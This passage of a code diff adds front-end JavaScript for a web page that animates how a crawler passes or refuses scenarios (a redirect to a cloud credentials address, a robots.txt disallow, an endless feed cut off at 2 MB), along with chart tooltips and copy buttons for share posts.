+        ['s-url', 'fail', 'The new link is a raw IP address, the one cloud servers use to hand out credentials. Refused.']
+      ]
+    },
+    robots: {
+      ok: false, verdict: 'Skipped politely. The site asked bots not to read this path.',
+      steps: [
+        ['s-url', 'pass', 'https://calendar.example.edu/events is fine.'],
+        ['s-dns', 'pass', 'Public address.'],
+        ['s-robots', 'fail', 'robots.txt says "User-agent: * / Disallow: /events". The bot respects it and moves on.']
+      ]
+    },
+    endless: {
+      ok: false, verdict: 'Stopped mid-download. The response passed the size limit.',
+      steps: [
+        ['s-url', 'pass', 'https://feeds.example.com/all.ics is fine.'],
+        ['s-dns', 'pass', 'Public address.'],
+        ['s-robots', 'pass', 'Allowed.'],
+        ['s-wait', 'pass', 'Paced as usual.'],
+        ['s-connect', 'pass', 'Connects to the checked IP.'],
+        ['s-limits', 'fail', 'The feed keeps streaming with no end. At 2 MB, the feed limit, the download is cut off.']
+      ]
+    }
+  };
+
+  const chips = Array.from(document.querySelectorAll('[data-scenario]'));
+  const stepsEl = document.getElementById('steps');
+  const verdictEl = document.getElementById('verdict');
+  const refused = document.getElementById('s-refused');
+  const redirectPath = document.getElementById('e-redirect');
+  const reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  let timers = [];
+
+  function show(name) {
+    const sc = S[name];
+    timers.forEach(clearTimeout); timers = [];
+    chips.forEach(c => c.setAttribute('aria-pressed', String(c.dataset.scenario === name)));
+    order.forEach(id => document.getElementById(id).setAttribute('class', 'node is-dim'));
+    refused.setAttribute('class', 'refused');
+    redirectPath.setAttribute('class', 'redirect');
+    stepsEl.textContent = '';
+    verdictEl.textContent = sc.verdict;
+    verdictEl.className = 'verdict ' + (sc.ok ? 'ok' : 'bad');
+
+    const last = sc.steps.length - 1;
+    sc.steps.forEach(([id, state, text], i) => {
+      const li = document.createElement('li');
+      const tag = document.createElement('span');
+      tag.className = 'v-' + state;
+      tag.textContent = state === 'pass' ? 'Pass. ' : state === 'fail' ? 'Refused. ' : 'Redirect. ';
+      li.append(tag, document.createTextNode(text));
+      stepsEl.append(li);
+
+      const apply = () => {
+        const node = document.getElementById(id);
+        const cls = state === 'fail' ? 'is-fail' : 'is-pass';
+        node.setAttribute('class', 'node ' + cls);
+        if (state === 'redirect') {
+          redirectPath.setAttribute('class', 'redirect is-active');
+          order.forEach(o => { if (o !== id) document.getElementById(o).setAttribute('class', 'node is-dim'); });
+        }
+        if (i === last && state === 'fail') refused.setAttribute('class', 'refused is-fail');
+      };
+      if (reduce) apply(); else timers.push(setTimeout(apply, i * 260));
+    });
+  }
+  chips.forEach(c => c.addEventListener('click', () => show(c.dataset.scenario)));
+  show('normal');
+
+  /* ---------- Chart tooltip ---------- */
+  const chart = document.getElementById('tests-chart');
+  const tip = document.getElementById('tip');
+  chart.querySelectorAll('g[data-tip]').forEach(g => {
+    const bar = g.querySelector('.bar');
+    g.addEventListener('mousemove', e => {
+      const box = chart.parentElement.getBoundingClientRect();
+      tip.textContent = g.dataset.tip;
+      tip.style.left = (e.clientX - box.left) + 'px';
+      tip.style.top = (e.clientY - box.top) + 'px';
+      tip.hidden = false;
+      bar.classList.add('is-hover');
+    });
+    g.addEventListener('mouseleave', () => { tip.hidden = true; bar.classList.remove('is-hover'); });
+  });
+
+  /* ---------- Share posts: copy + character count ---------- */
+  document.querySelectorAll('[data-count-for]').forEach(el => {
+    const ta = document.getElementById(el.dataset.countFor);
+    const update = () => { el.textContent = ta.value.length + ' characters'; };
+    ta.addEventListener('input', update); update();
+  });
+  document.querySelectorAll('[data-copy]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const ta = document.getElementById(btn.dataset.copy);
+      const done = () => { btn.textContent = 'Copied'; setTimeout(() => { btn.textContent = 'Copy post'; }, 1800); };
+      const fallback = () => { ta.focus(); ta.select(); btn.textContent = 'Selected: press Ctrl+C'; };
+      try {
+        navigator.clipboard.writeText(ta.value).then(done, fallback);
+      } catch (e) { fallback(); }
+    });
+  });
+})();
+</script>
